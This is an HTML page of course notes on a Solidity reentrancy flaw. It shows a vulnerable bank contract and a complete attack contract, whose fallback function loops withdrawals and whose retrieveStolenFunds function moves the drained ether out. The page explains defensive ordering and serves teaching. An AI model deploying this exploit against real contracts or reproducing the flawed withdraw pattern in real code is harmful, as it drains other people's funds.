<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Example: Attack to a Vulnerable code</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Example: Attack to a Vulnerable code</h1><br/><br />Vulnerable code: <a href="https://github.com/cclabsInc/BlockChainExploitation/blob/master/2020_BlockchainFreeCourse/reentrancy/simpleReentrancy.sol">https://github.com/cclabsInc/BlockChainExploitation/blob/master/2020_BlockchainFreeCourse/reentrancy/simpleReentrancy.sol</a><br /><div class="codebox"><pre>pragma solidity ^0.6.6;<br /><br />contract simpleReentrancy {<br />    mapping (address =&gt; uint) private balances;<br />    <br />    function deposit() public payable  {<br />        require((balances[msg.sender] + msg.value) &gt;= balances[msg.sender]);<br />        balances[msg.sender] += msg.value;<br />    }<br /><br />    function withdraw(uint withdrawAmount) public returns (uint) {<br />        <span style="color:#0088ff;font-weight:400">//Checks that you are only withdrawing the amount you have in your account or sends back an error</span><br />        require(withdrawAmount &lt;= balances[msg.sender]);<br />        <span style="color:#0088ff;font-weight:400">//Sends your requested amount to the address the requested a withdrawal</span><br />        msg.sender.call.value(withdrawAmount)(<span style="color:#3ad900;font-weight:400">&quot;&quot;</span>);        <span style="color:#0088ff;font-weight:400">//&lt;-- PROBLEM</span><br />        <span style="color:#0088ff;font-weight:400">//Deducts the amount withdrawn from the accounts total balance</span><br />        balances[msg.sender] -= withdrawAmount;           <span style="color:#0088ff;font-weight:400">//&lt;-- PROBLEM</span><br />        <span style="color:#ff9d00;font-weight:700">return</span> balances[msg.sender];<br />    }<br />    <br />    function getBalance() public view returns (uint){<br />        <span style="color:#ff9d00;font-weight:700">return</span> balances[msg.sender];<br />    }<br />}</pre></div><br />This function is following a:  <br />   ◇ Checks →  Interaction →  Effects<br />which violates the:<br />   ◇ Checks →  Effects →  Interactions <br /><br />Because we interact with an external entity prior to updating the effects, the target contract is at risk for a call by a malicious contract that executes a loop with a malicious purpose.<br /><br /><strong><h3>Attack code Contract example</h3></strong>(<a href="https://github.com/cclabsInc/BlockChainExploitation/blob/master/2020_BlockchainFreeCourse/reentrancy/simpleReentrancyAttack.sol">github code</a>)<br />The main attack code in this contract is found on lines 32-38. This code creates a looping condition into the other contract by using a <strong>fallback function</strong>.<br /><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">//creates an interface into the target contract via its function definitions</span><br />interface targetInterface{<br />    function deposit() external payable; <br />    function withdraw(uint withdrawAmount) external; <br />}<br /><br />contract simpleReentrancyAttack{<br />    <span style="color:#0088ff;font-weight:400">//interface is set to the address of the target contract</span><br />    targetInterface bankAddress = targetInterface(<span style="color:#ff0044;font-weight:400">0xd9145CCE52D386f254917e481eB44e9943F39138</span>); <span style="color:#0088ff;font-weight:400">//address of the deployed target contract</span><br />    uint amount = <span style="color:#ff0044;font-weight:400">1</span> ether; <br /><br />    function deposit() public payable{<br />        bankAddress.deposit.value(amount)();<br />    }<br />    <br />    function getTargetBalance() public view returns(uint){<br />        <span style="color:#ff9d00;font-weight:700">return</span> address(bankAddress).balance; <br />    }<br />    <br />    function attack() public payable{<br />        bankAddress.withdraw(amount); <br />    }<br />    <br />    <span style="color:#0088ff;font-weight:400">//after the attack we will take the balance of “this” contract and transfers it to our personal address</span><br />    function retrieveStolenFunds() public {<br />        msg.sender.transfer(address(this).balance);<br />    }<br />    <br />    <span style="color:#0088ff;font-weight:400">//This second function is something called a fallback function.</span><br />    <span style="color:#0088ff;font-weight:400">//This function is used to accept payments that come into the contract when no function is specified. </span><br />    <span style="color:#0088ff;font-weight:400">//You will notice this function does not have a name but is set to payable.</span><br />    fallback () external payable{ <br />    <span style="color:#0088ff;font-weight:400">//checking that the target accounts balance is greater than the amount being withdrawn</span><br />     <span style="color:#ff9d00;font-weight:700">if</span> (address(bankAddress).balance &gt;= amount){<br />         <span style="color:#0088ff;font-weight:400">//calling the withdraw function to continue the loop which will in turn be sent back to the fallback function</span><br />         <span style="color:#0088ff;font-weight:400">//and repeat lines over and over until the target contracts balance is less than the amount being requested.</span><br />         bankAddress.withdraw(amount);<br />     }   <br />    }<br />}</pre></div><br />    <a href=""><img src="images/1391-1.png" alt="images/1391-1.png" /></a><br />   1) The attack() function calls into the withdraw function of the vulnerable contract<br />   2) Then the fallback function is entered from the withdrawal transaction <br />   3) fallback function returns right back to the beginning of the withdraw function into the contract.<br />   This forms the loop between withdraw and fallback until the contract is below 1 ether.<br /><br /><strong>Interface</strong><br />With an interface set<br /><div class="codebox"><pre>interface targetInterface{<br />    function deposit() external payable; <br />    function withdraw(uint withdrawAmount) external; <br />}<br /><br />targetInterface bankAddress = targetInterface(ADD_TARGET_ADDRESS);</pre></div><br />we can call the functions directly with the bankAddress interface using the function name as seen in the deposit function and attack function to call deposit and withdraw.<br />    <div class="codebox"><pre>bankAddress.deposit.value(amount)()  <span style="color:#0088ff;font-weight:400">//deposit</span><br />bankAddress.withdraw(amount)         <span style="color:#0088ff;font-weight:400">//withdraw</span></pre></div><br /><br /><br /></div>
</body>
</html>
